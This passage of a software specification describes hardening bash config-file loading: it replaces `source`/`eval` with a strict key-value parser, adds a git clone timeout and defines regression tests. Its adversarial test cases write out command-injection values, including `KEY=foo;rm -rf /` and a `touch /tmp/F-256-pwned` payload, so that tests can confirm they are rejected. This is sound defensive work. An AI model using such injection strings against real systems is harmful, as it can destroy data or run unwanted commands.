  - **AC-4.7**: **Given** F-1's `aod_init_read_validated` validator is amended in F-2's PR (NOT F-1's), **When** a reviewer reads `.aod/scripts/bash/init-input.sh` post-F-2, **Then** the validator additionally rejects `$`, `\`, backtick at the prompt boundary; the CHANGELOG entry (per FR-008) documents this one-time contract amendment.

- **FR-005**: System MUST refactor `.aod/scripts/bash/template-substitute.sh:162-209` (`aod_template_load_personalization_env`) to replace the subshell-validate-then-caller-source double-read pattern with a single call to `aod_template_load_kv_file "$path" "AOD_PERSONALIZATION_" AOD_CANONICAL_PLACEHOLDERS`.
  - **AC-5.1**: **Given** the post-F-2 `aod_template_load_personalization_env` body, **When** a reviewer reads it, **Then** the function is ~7 lines (path validation + library delegation), down from 47 lines of subshell-validate-then-caller-source code.
  - **AC-5.2**: **Given** the post-F-2 loader is invoked, **When** `strace -e openat` (Linux) or `dtruss` (macOS) traces the call, **Then** the trace shows exactly **one** `openat(...)` of the personalization.env path within the function body. **[MANUAL-ONLY]** trace-tool invocation is platform-specific; automated test asserts the function calls the library exactly once instead.
  - **AC-5.3**: **Given** a fixture race-test that swaps `.aod/personalization.env` content via a forked process between any two operations within the loader, **When** the loader returns, **Then** the values in caller scope match the file's content **at the moment of `cat`** — not the post-swap content.
  - **AC-5.4**: **Given** behavior preservation requirements, **When** the post-F-2 loader is invoked with various inputs, **Then**: missing-path → exit 1 (unchanged); file-absent → exit 3 (unchanged, was return 3 now via library); validation-failure → exit 8 (unchanged, the regex implicitly rejects newline / NUL because they don't match the value-class character set); missing-key detection → exit 8 with the missing-key list (unchanged behavior, now via whitelist mechanism); caller-scope variables `AOD_PERSONALIZATION_<KEY>` populated (unchanged).

- **FR-006**: System MUST add a portable `git clone` timeout in `aod_template_fetch_upstream` (`.aod/scripts/bash/template-git.sh:102-104`) using the bash background-process + watchdog pattern. Default `AOD_FETCH_TIMEOUT=60`; override via positive-integer env var; rejection of `=0`/non-numeric with exit 1 (per Q-3 footgun ruling).
  - **AC-6.1**: **Given** a hanging-upstream fixture (TCP listener that accepts but never responds), **When** `aod_template_fetch_upstream` is invoked with `AOD_FETCH_TIMEOUT=3`, **Then** the function returns exit **9** within ~3-4 seconds, the partial checkout at `destdir` does not exist, and stderr contains `[aod] ERROR: upstream fetch timed out after 3s for url=... ref=...`.
  - **AC-6.2**: **Given** the same hanging fixture, **When** `aod_template_fetch_upstream` is invoked with `AOD_FETCH_TIMEOUT=10`, **Then** the function returns exit 9 at ~10s, not 60s.
  - **AC-6.3**: **Given** `AOD_FETCH_TIMEOUT=0`, **When** `aod_template_fetch_upstream` is called, **Then** the function returns exit **1** with `[aod] ERROR: AOD_FETCH_TIMEOUT must be a positive integer (got: 0)`.
  - **AC-6.4**: **Given** `AOD_FETCH_TIMEOUT=abc` (or any non-numeric/leading-zero value), **When** the function is called, **Then** the function returns exit 1 with the same shape of error.
  - **AC-6.5**: **Given** a fast-clone fixture (clone completes in <1s), **When** `aod_template_fetch_upstream` is invoked with `AOD_FETCH_TIMEOUT=60`, **Then** the function returns exit **0**, the watchdog `sleep 60` is killed by the post-wait `kill "$watchdog_pid"` cleanup, and no zombie process remains.
  - **AC-6.6**: **Given** the watchdog SIGINT trap (per L-1), **When** the outer script (`init.sh` or `update.sh`) is interrupted with Ctrl+C while a clone is in progress, **Then** the trap fires `kill "$watchdog_pid_local"`, the watchdog is reaped, and no orphan watchdog process remains.

- **FR-007**: System MUST author a public ADR-040 at `docs/architecture/02_ADRs/ADR-040-config-file-parsing-hardening.md` documenting the migration. The ADR MUST follow the dual-commit pattern (Proposed → Accepted, per Q-6 ruling and F-1 ADR-038 precedent) and MUST contain: Status, Context (the four `source`/`eval` sites + F-1 precedent + Daniel Wood LinkedIn note), Decision (read-buffer → strict-KV-regex → `printf -v` canonical pattern; Q-1 single-PR rationale; Q-3 footgun rationale; H-2 TOCTOU residual race window framing; F-1 prompt validator amendment per B-2 Path R-2), Alternatives Considered (six alternatives: JSON, TOML, point-fixes, `set -r`, `bash -r -c`, source-then-`declare -p` diff per M-5), Consequences (one canonical pattern; bash 3.2 preserved; perf benchmark per SC-010 with canonical fixture set + methodology; awk micro-opt rejected; ADR-038 relationship; CHANGELOG/F-1 contract amendment), Related Findings (5 vuln_ids), References (web archive snapshot of LinkedIn note; F-1 ADR-038; F-250 ADR-039).
  - **AC-7.1**: **Given** the post-F-2 repository, **When** a reviewer locates `docs/architecture/02_ADRs/ADR-040-config-file-parsing-hardening.md`, **Then** the file exists.
  - **AC-7.2**: **Given** the file exists, **When** a reviewer reads its Status field, **Then** the value is `Accepted` (after dual-commit promotion per Q-6).
  - **AC-7.3**: **Given** the ADR §Alternatives Considered, **When** a reviewer reads it, **Then** all six alternatives are listed with rationale for rejection (JSON config, TOML config, individual point-fixes, `set -r` restricted shell, `bash -r -c`, source-then-`declare -p` diff).
  - **AC-7.4**: **Given** the ADR §Decision, **When** a reviewer reads it, **Then** the canonical read-buffer → strict-KV-regex → `printf -v` pattern is documented; Q-1 (single-PR vs split) rationale is recorded; Q-3 (`AOD_FETCH_TIMEOUT=0` footgun) rationale is recorded; H-2 (TOCTOU residual race window framing) is documented; F-1 prompt validator amendment per B-2 Path R-2 is documented.
  - **AC-7.5**: **Given** the ADR §Consequences, **When** a reviewer reads it, **Then** the canonical fixture set is enumerated (`stacks/nextjs-supabase/defaults.env`, `stacks/fastapi-react/defaults.env`, recorded-valid `aod-kit-version`, recorded-valid `personalization.env`); the methodology is recorded (100 invocations × 4 fixtures × p50/p95; per-file delta NOT aggregate; warm/cold cache reported separately); awk micro-opt is documented as REJECTED (BSD vs GNU awk variance + audit-readability concern); the ADR-038 relationship is noted (substitution canon + config-load canon share the validation triplet pattern).
  - **AC-7.6**: **Given** the ADR §References, **When** a reviewer reads it, **Then** a `web.archive.org` snapshot URL of Daniel Wood's 2026-05-02 LinkedIn note is present; F-1 ADR-038 is cited; F-250 ADR-039 is cited.
  - **AC-7.7**: **Given** the dual-commit pattern, **When** Stream 3 progresses, **Then** the first commit lands the ADR with `Status: Proposed`; the second commit promotes to `Status: Accepted` after Stream 5 verification (post-CI matrix green, pre-merge), folding in benchmark numbers per SC-010.

- **FR-008**: System MUST trigger a release-please release via Conventional-Commits PR title and belt-and-suspenders post-merge verification (per `.claude/rules/git-workflow.md` precedent and F-212 incident memory). CHANGELOG entry MUST include a note documenting the F-1 prompt validator amendment (the one-time contract change to reject `$`, `\`, backtick — for adopters whose `PROJECT_NAME`/`PROJECT_DESCRIPTION` contain these characters).
  - **AC-8.1**: **Given** the draft PR is created, **When** the title is examined, **Then** it is `feat(256): harden source-pattern surface — bash source/eval → KV parser + clone timeout` (Conventional-Commits-formatted).
  - **AC-8.2**: **Given** F-2 is squash-merged, **When** the post-merge belt-and-suspenders verification runs `gh pr list --state open --search "release-please" --limit 3`, **Then** a release-please PR appears within ~30 seconds. **[MANUAL-ONLY]** post-merge verification is run by the closing operator at `/aod.deliver`, not by an automated test in this PR.
  - **AC-8.3**: **Given** the release-please PR did NOT open within ~30s, **When** the operator pushes an empty release-marker commit (`feat(256): source-pattern hardening — release marker`), **Then** a release-please PR opens within the following ~30s. **[MANUAL-ONLY]** fallback path executed only if AC-8.2 fails.
  - **AC-8.4**: **Given** the post-F-2 CHANGELOG, **When** a reviewer reads the v4.x entry, **Then** it contains a note documenting (a) the new library `aod_template_load_kv_file`, (b) the four refactored sites + clone timeout, (c) the F-1 contract amendment (`aod_init_read_validated` now rejects `$`, `\`, backtick at prompt boundary) with adopter migration guidance.

- **FR-009**: System MUST land the regression protection test suite using **pytest-via-subprocess** (NOT bats), per F-1 BLOCKING B-1 precedent (already-adjudicated and applied to F-2). Test files MUST land at `tests/scripts/test_template_config_load_*.py` and adjacent paths per the existing pytest convention.
  - **AC-9.1**: **Given** the post-F-2 test tree, **When** a reviewer runs `find tests -name "*.bats"`, **Then** the result is **zero matches**.
  - **AC-9.2**: **Given** the post-F-2 test tree, **When** a reviewer locates `tests/scripts/`, **Then** five new test files exist: `test_template_config_load_unit.py` (Test-1), `test_template_config_load_integration.py` (Test-2), `test_template_git_clone_timeout.py` (Test-3), `test_init_sh_defaults_env.py` (Test-4), `test_template_substitute_lint_no_eval.py` (Test-5).
  - **AC-9.3**: **Given** the existing CI matrix (macos-latest bash 3.2.57 + ubuntu-latest bash 5.x), **When** F-2 lands, **Then** the same matrix runs the new tests with no new workflow file added.
  - **AC-9.4**: **Given** the post-F-2 fixtures directory, **When** a reviewer locates `tests/fixtures/config-load/`, **Then** subdirectories `valid/` and `adversarial/` exist with KV fixtures (each adversarial fixture carries a `# DO NOT SOURCE` header per L-2); a `tests/fixtures/regenerate-config-load-baseline.sh` script exists for fixture regeneration (per F-1 M-5 precedent).
  - **AC-9.5**: **Given** the F-2 conftest, **When** a reviewer reads `tests/scripts/conftest.py`, **Then** a session-scoped `hanging_upstream` fixture (per M-3 + F-250 ADR-039 fixture-scope canon) is defined and used by `test_template_git_clone_timeout.py`.

### Non-Functional Requirements

- **NFR-001 (Cross-platform parity)**: All tests MUST pass on macOS (bash 3.2.57 default) AND Linux (bash 4+). No bash-4-only features (no associative arrays, no `mapfile`/`readarray`, no `${var,,}` lowercase expansion) in `aod_template_load_kv_file`, in any refactor-site code, or in the clone-timeout watchdog. CI gates merge on both green via the existing pytest matrix (NFR-001 + FR-009).

- **NFR-002 (No new runtime dependencies)**: System MUST NOT introduce any new runtime dependencies. Diff on `pyproject.toml`, `requirements*.txt`, `package.json`, and any other dependency manifest MUST be empty. The library uses bash builtins only (`cat`, `printf`, `[[`, `=~`, parameter expansion `${var}`, indirect expansion `${!var}`, here-strings `<<<`, command substitution `$(...)`); the clone-timeout uses `&`, `wait`, `kill`, `sleep` (all bash builtins / POSIX utilities universally available). NO GNU coreutils `timeout(1)` invocation.

- **NFR-003 (Backward-compatible KV format)**: The new loader MUST accept the **exact KV format** that the existing `source` paths accepted for **valid** input — `KEY=value`, `KEY="quoted value"`, `KEY='single-quoted'`, comment lines (`#`), blank lines, leading whitespace, CRLF line endings, files without trailing newline, bare `KEY=` (empty unquoted, per B-1). Adopters with valid, well-formed config files see zero behavior change. The semantics tightening rejects exactly what was previously implicit code-smell: command substitution, parameter expansion, escape sequences, embedded shell metachars in unquoted values. CHANGELOG (per FR-008 AC-8.4) documents the F-1 contract amendment for adopters whose `PROJECT_NAME`/`PROJECT_DESCRIPTION` contains `$`, `\`, or backtick.

- **NFR-004 (Performance neutrality with measurable escalation)**: Init duration on a fresh checkout MUST NOT regress by more than **25% under default conditions** (the new `aod_template_load_kv_file` path on the canonical fixture set — four real config files: `stacks/nextjs-supabase/defaults.env`, `stacks/fastapi-react/defaults.env`, recorded-valid `aod-kit-version`, recorded-valid `personalization.env`). Stream 1 Day 1 includes a benchmark comparison; both timings MUST be recorded in ADR-040 §Consequences. Methodology: 100 invocations × 4 fixtures × p50/p95; per-file delta (NOT aggregate); warm-cache + cold-cache reported separately (per F-250 ADR-039 cache-state-aware reporting precedent). Threshold ladder per Q-5 ruling:
  - **≤ 5% delta**: NFR-004 holds at 10%; no PRD update needed.
  - **5%-25% delta**: ADR-040 documents the actual delta; NFR-004 loosens to 25% with rationale (the security improvement justifies a constant-factor cost on a bounded-size config file). Architect record-only escalation.
  - **25%-50% delta**: Accept-and-document (Q-5 Option a, tightened) — loosen NFR-004 to 50%; ADR-040 §Consequences MUST include both raw numbers AND security tradeoff rationale; Team-Lead approval recorded in spec.md.
  - **> 50% delta**: spec author escalates to PM for re-scope (Q-5 Option c) — three re-scope levers: (i) Q-1 split (F-2a-first), (ii) drop whitelist, (iii) accept >50% with explicit security tradeoff in ADR-040 + CHANGELOG.

  Awk micro-optimization REJECTED per Q-5 ruling (BSD vs GNU awk variance contradicts NFR-002; complexity creep on a security-load primitive that must be audit-readable).

- **NFR-005 (Zero `finding.yaml` schema change)**: `schemas/finding.yaml` MUST NOT be modified. The five vuln_id closures use the existing schema; the `.security/vulnerabilities.jsonl` `REMEDIATED` events conform to the existing event shape. Ninth consecutive feature preserving the BLP-01 detection-tier contract.

- **NFR-006 (No new agent files; no orchestrator changes)**: F-2 is a bash-library refactor + a new sourced helper file + an ADR + a CHANGELOG entry. No agent files in `.claude/agents/` change; no orchestrator phase additions; no `tachi.run` chain step additions. The change is contained to the bash-library surface and its tests.

### Key Entities

- **`aod_template_load_kv_file`** (NEW): the canonical config-file load primitive. Located in `.aod/scripts/bash/template-config-load.sh`. Signature: `aod_template_load_kv_file <path> <var_prefix> [<allowed_keys_array_name>] [<key_case>]`. Behavior: read-buffer → strict-KV-regex → `printf -v` assignment. Exit codes: 0 (success), 1 (argument error), 3 (file absent), 8 (validation failure). Bash 3.2 compatible. **Sole entry point** for config-file loading post-F-2; future config-load sites adopt this function rather than inventing per-site validation.

- **Stack-pack defaults schema** (NEW contract): `contracts/stack-pack-defaults-schema.md` documents the canonical key set for `stacks/<pack>/defaults.env` (`TECH_STACK`, `TECH_STACK_DATABASE`, `TECH_STACK_VECTOR`, `TECH_STACK_AUTH`, `CLOUD_PROVIDER`) plus value-shape constraints. Analogous to F-1's `contracts/personalization-schema.md`; keeps lockstep contract for whitelist updates.

- **Personalization snapshot** (`.aod/personalization.env`): the canonical KEY=VALUE record of all 12 placeholder values, written at init time, sourced post-F-2 via `aod_template_load_kv_file` (was: subshell-validate-then-caller-source). Local-only by default per F-1 (gitignored); F-2 inherits and does not change the gitignore posture.

- **Canonical placeholder array** (`AOD_CANONICAL_PLACEHOLDERS`): the locked array at `.aod/scripts/bash/template-substitute.sh:50-63` (12 elements; possibly 13 under F-1 Option (a) if `PROJECT_PATH` was added). Reused as the whitelist for `aod_template_load_kv_file` at the personalization.env site.

- **Version file** (`.aod/aod-kit-version`): the canonical lowercase-fields KV file with 5 well-documented keys (`version`, `sha`, `updated_at`, `upstream_url`, `manifest_sha256`). Read by `aod_template_read_version_file`; written by `aod_template_write_version_file`. Post-F-2 reads via `aod_template_load_kv_file "$path" "" "" lower` (no whitelist; lowercase mode); pre-existing per-field validators at `template-git.sh:568+` run unchanged after the load.

- **Substitution surface** (post-F-1): the set of personalization-target files matched by the existing `find` filter in `init.sh`. Untouched by F-2 except for the eval-removal in `aod_template_init_personalization` and the writer escape-pass removal at `:566-571`.

- **Vulnerability event log** (`.security/vulnerabilities.jsonl`): the audit trail capturing `DETECTED → REMEDIATED` transitions. F-2 adds 5 `REMEDIATED` events post-merge with the squash-merge SHA and timestamp; schema is preserved (NFR-005).

- **ADR-040** (NEW): the public architectural decision record for config-file parsing hardening. New file at `docs/architecture/02_ADRs/ADR-040-config-file-parsing-hardening.md`. Documents the canonical pattern, the six rejected alternatives, and the relationship to ADR-038 (substitution canon + config-load canon share the validation-triplet pattern). Dual-commit pattern (Proposed → Accepted) per Q-6.

- **`AOD_FETCH_TIMEOUT`** (NEW env var): positive-integer override for the default 60-second `git clone` timeout. Validation regex `^[1-9][0-9]*$` rejects `0`, leading-zero values, negatives, non-integers (per Q-3 ruling — preserves the protection F-2 is closing).

## Success Criteria *(mandatory)*

### Vulnerability Closure (5 of 5 — primary)

- **SC-001**: All five vuln_ids transition `DETECTED → REMEDIATED` in `.security/vulnerabilities.jsonl` with timestamp and merging commit SHA recorded:
  - TACHI-VULN-6f5a95085056 (HIGH — `source defaults.env`)
  - TACHI-VULN-bf5496e9fcdf (HIGH — `source aod-kit-version` before validation)
  - TACHI-VULN-9a7512071b4a (MEDIUM — `eval`-based dynamic assignment)
  - TACHI-VULN-4dc6cf8f88ea (MEDIUM — TOCTOU on `personalization.env`)
  - TACHI-VULN-851fd6a21ba9 (LOW — `git clone` no timeout)
- **SC-002**: Post-merge `/security` re-scan against `main` HEAD produces zero new findings within the source-pattern surface this feature touched (`scripts/init.sh`, `.aod/scripts/bash/template-git.sh`, `.aod/scripts/bash/template-substitute.sh`, `.aod/scripts/bash/template-config-load.sh`). **[MANUAL-ONLY]** verification by the closing operator at `/aod.deliver`.

### Config-Load Primitive Correctness

- **SC-003**: `.aod/scripts/bash/template-config-load.sh` exposes `aod_template_load_kv_file <path> <var_prefix> [<allowed_keys_array_name>] [<key_case>]` with the regex-validate → reject-on-mismatch → `printf -v` assignment behavior specified in FR-001. No `eval` in the function body. The 4th-arg `<key_case>` parameter accepts `upper` (default) and `lower` ONLY (per Q-2.5 ruling).
- **SC-004**: All four `source`/`eval`-config-load sites use `aod_template_load_kv_file`:
  - `init.sh:106` (defaults.env, with `STACK_PACK_ALLOWED_KEYS` whitelist; upper-case mode).
  - `template-git.sh:561` (aod-kit-version primary read, no whitelist; lowercase mode per Q-2.5) and `aod_template_write_version_file:485-515` (inner round-trip block at `:501`, lowercase mode; per H-3 correction).
  - `template-substitute.sh:162-209` (personalization.env, with `AOD_CANONICAL_PLACEHOLDERS` whitelist; upper-case mode).
- **SC-005**: Zero `eval` invocations remain in `.aod/scripts/bash/template-substitute.sh` after the refactor. Verified via `grep -c '\beval\b' .aod/scripts/bash/template-substitute.sh` returning `0`.

### Adversarial-Input Rejection (defense-in-depth)

- **SC-006**: Each of the four refactored sites accepts a malformed-input fixture and exits with code **8** + a clear error naming the line number and offending content. Adversarial cases include (per Test-2 enumeration): shell metachar in unquoted value (e.g., `KEY=foo;rm -rf /`), unbalanced quote, `KEY=` followed by `$(...)` command substitution, KEY with lowercase (in upper-mode site), missing whitelisted key, line with only KEY and no `=`, value with embedded literal newline, value with embedded NUL.
- **SC-007**: No silent execution: a fixture containing `version='1.0'; touch /tmp/F-256-pwned` placed at `.aod/aod-kit-version` is rejected exit 8 with no `/tmp/F-256-pwned` ever created.

### Clone Timeout Correctness

- **SC-008**: `aod_template_fetch_upstream` against a fixture upstream that intentionally hangs (test fixture: a local TCP listener that accepts but never responds) times out at the configured `AOD_FETCH_TIMEOUT` (default 60s; test uses 3s for fast CI). Partial checkout is cleaned up (`destdir` does not exist post-failure). Function returns exit code **9**.
- **SC-009**: `AOD_FETCH_TIMEOUT` override is respected: `AOD_FETCH_TIMEOUT=10 aod_template_fetch_upstream ...` against the hanging fixture times out at ~10s, not 60s. `AOD_FETCH_TIMEOUT=0` and non-numeric values return exit 1 (per Q-3 footgun ruling).

### Performance Benchmark Contract (per F-1 H-2 precedent)

- **SC-010**: Stream 1 includes a benchmark of the new `aod_template_load_kv_file` path against the pre-F-2 `source` path on the canonical fixture set (the four real config files in tachi). Both timings recorded in ADR-040 §Consequences. **Methodology**: 100 invocations per fixture file; report median (p50) AND 95th percentile (p95); function-call execution only (library-source startup cost is a separate sub-millisecond line item); warm-cache (typical interactive use) AND cold-cache (CI runner state) numbers reported separately per F-250 ADR-039 precedent; per-file delta (NOT aggregate). Compute delta as `(new p50 - old p50) / old p50`; round to 1 decimal place. Threshold ladder per NFR-004.

### ADR + Governance + Release Trigger

- **SC-011**: Public ADR-040 (`docs/architecture/02_ADRs/ADR-040-config-file-parsing-hardening.md`) is authored documenting the read-buffer → strict-regex → `printf -v` pattern, six alternatives considered (JSON, TOML, point-fixes, `set -r`, `bash -r -c`, source-then-`declare -p` diff per M-5), the bash 3.2 compatibility constraint, and the relationship to ADR-038 (substitution canon). Status: Proposed → Accepted (dual-commit pattern per Q-6 + F-1 ADR-038 precedent). The split-or-bundle decision (Q-1 — single PR by default) is documented in §Decision per BLP-02 §F-2 Governance.
- **SC-012**: Triple Triad sign-off recorded on `tasks.md` (PM + Architect + Team-Lead).
- **SC-013**: PR title is Conventional-Commits-formatted as `feat(256): harden source-pattern surface — bash source/eval → KV parser + clone timeout` at draft creation. Belt-and-suspenders release verification per `.claude/rules/git-workflow.md`: post-merge `gh pr list --state open --search "release-please" --limit 3` returns a release-please PR within ~30s; if not, push an empty release-marker commit `feat(256): source-pattern hardening — release marker`.

### Cross-Cutting

- **SC-014**: Zero new runtime dependencies — empty diff on `pyproject.toml`, `requirements*.txt`, `package.json`, or any other dependency manifest.
- **SC-015**: All Regression Protection Plan tests (Test-1 through Test-5) pass on macOS (bash 3.2 default) AND Linux (bash 4+) via the existing pytest CI matrix (per F-1 precedent: pytest-via-subprocess, NOT bats — the matrix is already wired). `find tests -name '*.bats'` returns zero matches (NFR-001 + FR-009).

## Dependencies and Assumptions

### Dependencies

- **F-1 substitution surface (delivered 2026-05-04)**: F-2 inherits the validation-triplet pattern documented in F-1 ADR-038 §Decision Item 5 (regex-validate → reject-on-mismatch → `printf -v` assignment) and applies it to the **non-interactive file-parse** context. F-1 establishes the pattern; F-2 does NOT reuse the function (`aod_init_read_validated` is interactive `read -p`-only).
- **F-1 prompt validator amendment**: F-2's PR amends `aod_init_read_validated` (in `.aod/scripts/bash/init-input.sh`) to additionally reject `$`, `\`, backtick at the prompt boundary. This unlocks B-2 Path R-2 (writer escape pass removal in `template-substitute.sh:566-571`). CHANGELOG entry (per FR-008 AC-8.4) documents this one-time contract amendment.
- **Existing canonical placeholder array**: `AOD_CANONICAL_PLACEHOLDERS` at `.aod/scripts/bash/template-substitute.sh:50-63` (12 elements; possibly 13 if F-1 Option (a) was implemented for `PROJECT_PATH`). Reused as the whitelist for `aod_template_load_kv_file` at the personalization.env site (FR-005).
- **Existing per-field version validators**: `aod_template_read_version_file:568+` regex validators for `version`, `sha`, `updated_at`, `upstream_url`, `manifest_sha256`. F-2 preserves these; the load+validate sequence is `aod_template_load_kv_file → existing validators` (load now precedes shape-checks instead of being interleaved with bash interpretation).
- **Existing bash-library siblings**: `template-substitute.sh`, `template-git.sh`, `template-validate.sh`, `template-manifest.sh`, `template-json.sh`, `init-input.sh` (F-1). The new `template-config-load.sh` is the 7th sibling library; placement per Q-4 Option (a) ruling.
- **Existing pytest CI matrix**: `macos-latest` (bash 3.2.57) + `ubuntu-latest` (bash 5.x) runs `tests/scripts/test_*.py`. F-2 adds five new test files to the already-running matrix; no new workflow file (NFR-001).
- **F-2 reuse contract for future BLP features**: F-3, F-4, F-5 (and any future config-load site) MUST adopt `aod_template_load_kv_file` rather than `source`. Code review is a hard gate; ADR-040 §Decision is the canonical reference.

### Assumptions

- **macOS bash 3.2.57 remains the lowest-bound**: validated during F-1 research and inherited; no new bash-4-only features in F-2's library or refactor sites.
- **Daniel Wood's LinkedIn note is durable enough for archival snapshot**: the `web.archive.org` snapshot mandated in ADR-040 §References is the canonical evidence trail; the live LinkedIn URL is best-effort.
- **release-please cadence is generally < 30s post-merge** but can vary. The belt-and-suspenders empty-marker commit pattern (per F-212 incident lessons) closes this gap.
- **No adopter has a stack pack with `defaults.env` containing valid bash that is not KV-format**: the contract has always been "should be `KEY=value` lines"; F-2 enforces what was already documented. CHANGELOG entry provides clear migration guidance for the unlikely edge case (the rejection-error message names the offending line + content for self-service repair).
- **Stack-pack-extension contract evolution**: F-2's `STACK_PACK_ALLOWED_KEYS=(TECH_STACK TECH_STACK_DATABASE TECH_STACK_VECTOR TECH_STACK_AUTH CLOUD_PROVIDER)` is the locked set today; any future stack-pack key addition requires updating the array AND `contracts/stack-pack-defaults-schema.md` in lockstep (analogous to F-1 canonical-placeholder lockstep contract).
- **Hanging-listener test fixture is deterministic across CI runners**: the M-3 budget allocates 0.5d for the hanging-listener fixture; assumed bound is sufficient. If the fixture proves flaky on CI, a fallback uses a TCP socket bound to a port that connects-but-stalls.
- **`AOD_FETCH_TIMEOUT` environment variable is not already in use**: verified during research that the variable name is new (no existing reference in repo). If a future feature needs different timeout semantics, the variable name remains the singular contract.

## Regression Protection Plan (referenced from PRD §Regression Protection Plan)

The full Regression Protection Plan is detailed in [PRD §Regression Protection Plan](../../docs/product/02_PRD/256-source-pattern-hardening-2026-05-04.md). Summary:

- **Test-1**: `tests/scripts/test_template_config_load_unit.py` — `aod_template_load_kv_file` library function in isolation; ≥27 cases including: valid KV (no whitelist), valid KV (with whitelist), invalid line (command substitution, unbalanced quote, backtick, embedded `$`, KEY with lowercase in upper-mode), missing whitelisted key, KEY-only line, embedded literal newline, embedded NUL, bare `KEY=` empty unquoted (B-1), trailing-newline / no-trailing-newline / CRLF / leading-whitespace path-a (B-3 cases 19-23), defensive identifier check (H-1), missing-arg behavior, file-absent behavior, `<key_case>=lower` regex variant, `<key_case>=mixed` rejection.
- **Test-2**: `tests/scripts/test_template_config_load_integration.py` — adversarial inputs across all four refactored sites (init.sh defaults.env, template-git.sh aod-kit-version, template-substitute.sh personalization.env, template-substitute.sh writer round-trip). Includes M-1 framing precision + H-2 TOCTOU residual fixture (file-swap-during-load race test).
- **Test-3**: `tests/scripts/test_template_git_clone_timeout.py` — clone timeout behavior + writer→reader round-trip per H-3 + hanging-listener fixture per M-3 (session-scoped pytest fixture in `conftest.py`).
- **Test-4**: `tests/scripts/test_init_sh_defaults_env.py` — init.sh end-to-end with refactored defaults.env load. Includes Site A success case (all shipped stack packs load cleanly) + Site A adversarial case (malicious-pack rejected exit 8 with `/tmp/F-256-pwned` never created).
- **Test-5**: `tests/scripts/test_template_substitute_lint_no_eval.py` — `eval` removal verification. `grep -c '\beval\b' .aod/scripts/bash/template-substitute.sh` returns 0; future PR introducing a new `eval` fails this test (canonical-pattern enforcement). Renamed per L-2 from initial draft naming.
- **Test-6**: Manual smoke test on fresh checkout (gating). [MANUAL-ONLY] gating action by the closing operator before marking the feature ready.
- **Test-7**: Post-merge `/security` re-scan. [MANUAL-ONLY] verification by the closing operator at `/aod.deliver`.

Test fixtures land at `tests/fixtures/config-load/valid/` (NEW) and `tests/fixtures/config-load/adversarial/` (NEW) per L-2; each adversarial fixture carries a `# DO NOT SOURCE` header. Fixture regeneration script: `tests/fixtures/regenerate-config-load-baseline.sh` (NEW per F-1 M-5 precedent).

## Risks (referenced from PRD §Risks)

The full risk register is in the PRD. Top-of-mind risks for the spec:

- **R-1 (MEDIUM)**: Bash 3.2 compatibility regression — mitigated by NFR-001 + cross-platform CI matrix; the library uses only bash 3.2-compatible primitives (`${!var}`, `printf -v`, here-string `<<<`).
- **R-2 (MEDIUM)**: Performance regression on the canonical fixture — mitigated by NFR-004 + SC-010 measurable threshold ladder; awk micro-opt rejected per Q-5 (audit-readability).
- **R-3 (MEDIUM)**: Writer-reader round-trip break (escape pass removal in `template-substitute.sh:566-571`) — mitigated by F-1 `aod_init_read_validated` amendment in F-2's PR (rejecting `$`, `\`, backtick at prompt boundary); writer round-trip is preserved without negotiation.
- **R-4 (MEDIUM)**: Watchdog process-leak on outer-script SIGINT — mitigated by `trap` in `aod_template_fetch_upstream` cleaning up on SIGINT/SIGTERM/EXIT (per L-1).
- **R-5 (LOW)**: Hanging-listener fixture flakiness — mitigated by 0.5d M-3 budget + fallback TCP-stall fixture if needed.
- **R-6 (LOW)**: Adopter with non-KV bash in `defaults.env` (extremely unlikely; not documented usage) — mitigated by clear rejection error message + CHANGELOG migration guidance + the contract has always been KV-format.

## References

- **PRD**: [docs/product/02_PRD/256-source-pattern-hardening-2026-05-04.md](../../docs/product/02_PRD/256-source-pattern-hardening-2026-05-04.md)
- **Research**: [research.md](research.md)
- **Issue**: [#256](https://github.com/davidmatousek/tachi/issues/256)
- **F-1 spec (mirror structure)**: [specs/248-substitution-surface-hardening/spec.md](../248-substitution-surface-hardening/spec.md)
- **F-1 ADR-038 (validation-triplet pattern, substitution canon)**: [docs/architecture/02_ADRs/ADR-038-placeholder-substitution-strategy.md](../../docs/architecture/02_ADRs/ADR-038-placeholder-substitution-strategy.md)
- **F-250 ADR-039 (test architecture canon)**: [docs/architecture/02_ADRs/ADR-039-test-architecture-fixture-scope-and-asymmetric-baseline.md](../../docs/architecture/02_ADRs/ADR-039-test-architecture-fixture-scope-and-asymmetric-baseline.md)
- **Vulnerable code (target for refactor)**:
  - [scripts/init.sh:106](../../scripts/init.sh) (`source defaults.env`)
  - [.aod/scripts/bash/template-git.sh:561](../../.aod/scripts/bash/template-git.sh) (`source $path` in `aod_template_read_version_file`) and [:485-515](../../.aod/scripts/bash/template-git.sh) (inner round-trip block in `aod_template_write_version_file:501`)
  - [.aod/scripts/bash/template-substitute.sh:217](../../.aod/scripts/bash/template-substitute.sh), [:249](../../.aod/scripts/bash/template-substitute.sh), [:536](../../.aod/scripts/bash/template-substitute.sh), [:558](../../.aod/scripts/bash/template-substitute.sh) (eval-based assignment) and [:162-209](../../.aod/scripts/bash/template-substitute.sh) (`aod_template_load_personalization_env` TOCTOU)
  - [.aod/scripts/bash/template-git.sh:102-104](../../.aod/scripts/bash/template-git.sh) (`git clone` no timeout)
- **F-1 helper (validation-triplet precedent)**: [.aod/scripts/bash/init-input.sh](../../.aod/scripts/bash/init-input.sh) (`aod_init_read_validated`)
- **Daniel Wood LinkedIn note**: 2026-05-02 (URL pinned in ADR-040 §References with `web.archive.org` snapshot)
- **F-212 release-please incident**: `.claude/rules/git-workflow.md` Reference Incident section (informs FR-008 belt-and-suspenders pattern)
- **Constitution**: [.aod/memory/constitution.md](../../.aod/memory/constitution.md)
- **Git workflow rules**: [.claude/rules/git-workflow.md](../../.claude/rules/git-workflow.md)
- **BLP-02 strategy**: `_internal/strategy/BLP-02-enterprise-hardening.md` (if present)
